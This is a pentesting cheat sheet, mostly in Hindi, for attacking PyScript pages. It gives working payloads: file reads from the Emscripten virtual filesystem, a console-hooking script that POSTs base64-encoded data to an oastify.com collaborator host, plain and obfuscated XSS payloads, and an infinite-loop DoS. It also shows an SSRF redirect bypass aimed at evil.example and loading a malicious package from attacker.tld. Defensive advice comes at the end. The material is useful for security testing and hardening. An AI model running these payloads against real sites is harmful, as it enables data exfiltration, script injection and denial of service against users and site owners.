# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScript एक नया ढांचा है जो HTML में Python को एकीकृत करने के लिए विकसित किया गया है ताकि इसे HTML के साथ उपयोग किया जा सके। इस चीट शीट में, आप अपने पेनिट्रेशन टेस्टिंग उद्देश्यों के लिए PyScript का उपयोग कैसे करें, यह पाएंगे।

### Emscripten वर्चुअल मेमोरी फाइल सिस्टम से फ़ाइलें डंप करना / पुनः प्राप्त करना:

`CVE ID: CVE-2022-30286`\
\
कोड:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten वर्चुअल मेमोरी फाइल सिस्टम का OOB डेटा एक्सफिल्ट्रेशन (कंसोल मॉनिटरिंग)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
कोड:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### क्रॉस साइट स्क्रिप्टिंग (सामान्य)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### क्रॉस साइट स्क्रिप्टिंग (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### क्रॉस साइट स्क्रिप्टिंग (JavaScript ओबफस्केशन)

कोड:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS हमला (अनंत लूप)

कोड:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## नई कमजोरियाँ और तकनीकें (2023-2025)

### सर्वर-साइड अनुरोध धोखाधड़ी अनियंत्रित रीडायरेक्ट के माध्यम से (CVE-2025-50182)

`urllib3 < 2.5.0` `redirect` और `retries` पैरामीटर को अनदेखा करता है जब इसे **PyScript के साथ शिप किए गए Pyodide रनटाइम** के अंदर निष्पादित किया जाता है। जब एक हमलावर लक्षित URLs को प्रभावित कर सकता है, तो वे Python कोड को क्रॉस-डोमेन रीडायरेक्ट का पालन करने के लिए मजबूर कर सकते हैं, भले ही डेवलपर ने उन्हें स्पष्ट रूप से अक्षम कर दिया हो ‑ प्रभावी रूप से एंटी-SSRF लॉजिक को बायपास करना।
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0` में पैच किया गया - अपने PyScript इमेज में पैकेज को अपग्रेड करें या `packages = ["urllib3>=2.5.0"]` में एक सुरक्षित संस्करण पिन करें। विवरण के लिए आधिकारिक CVE प्रविष्टि देखें।

### मनमाने पैकेज लोडिंग और सप्लाई-चेन हमले

चूंकि PyScript `packages` सूची में मनमाने URLs की अनुमति देता है, एक दुर्भावनापूर्ण अभिनेता जो कॉन्फ़िगरेशन को संशोधित या इंजेक्ट कर सकता है, पीड़ित के ब्राउज़र में **पूर्ण रूप से मनमाना Python** निष्पादित कर सकता है:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*केवल शुद्ध-पायथन पहिए आवश्यक हैं - कोई वेबएसेम्बली संकलन चरण की आवश्यकता नहीं है।* सुनिश्चित करें कि कॉन्फ़िगरेशन उपयोगकर्ता-नियंत्रित नहीं है और अपने स्वयं के डोमेन पर HTTPS और SRI हैश के साथ विश्वसनीय पहिए होस्ट करें।

### आउटपुट सैनीटाइजेशन परिवर्तन (2023+)

* `print()` अभी भी कच्चा HTML इंजेक्ट करता है और इसलिए XSS-प्रवण है (उदाहरण ऊपर)।
* नया `display()` सहायक **डिफ़ॉल्ट रूप से HTML को एस्केप करता है** - कच्चा मार्कअप `pyscript.HTML()` में लपेटा जाना चाहिए।
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
यह व्यवहार 2023 में पेश किया गया था और इसे आधिकारिक Built-ins गाइड में दस्तावेजित किया गया है। अविश्वसनीय इनपुट के लिए `display()` पर भरोसा करें और सीधे `print()` को कॉल करने से बचें।

---

## Defensive Best Practices

* **पैकेज को अद्यतित रखें** – `urllib3 >= 2.5.0` पर अपग्रेड करें और नियमित रूप से साइट के साथ शिप होने वाले पहियों को फिर से बनाएं।
* **पैकेज स्रोतों को सीमित करें** – केवल PyPI नामों या समान-स्रोत URLs का संदर्भ दें, आदर्श रूप से Sub-resource Integrity (SRI) के साथ सुरक्षित।
* **Content Security Policy को मजबूत करें** – इनलाइन JavaScript (`script-src 'self' 'sha256-…'`) की अनुमति न दें ताकि इंजेक्ट किए गए `<script>` ब्लॉक्स निष्पादित न हो सकें।
* **उपयोगकर्ता द्वारा प्रदान किए गए `<py-script>` / `<script type="py">` टैग की अनुमति न दें** – अन्य उपयोगकर्ताओं को वापस भेजने से पहले सर्वर पर HTML को साफ करें।
* **कार्यकर्ताओं को अलग करें** – यदि आपको कार्यकर्ताओं से DOM तक समकालिक पहुंच की आवश्यकता नहीं है, तो `SharedArrayBuffer` हेडर आवश्यकताओं से बचने के लिए `sync_main_only` फ्लैग सक्षम करें।

## References

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
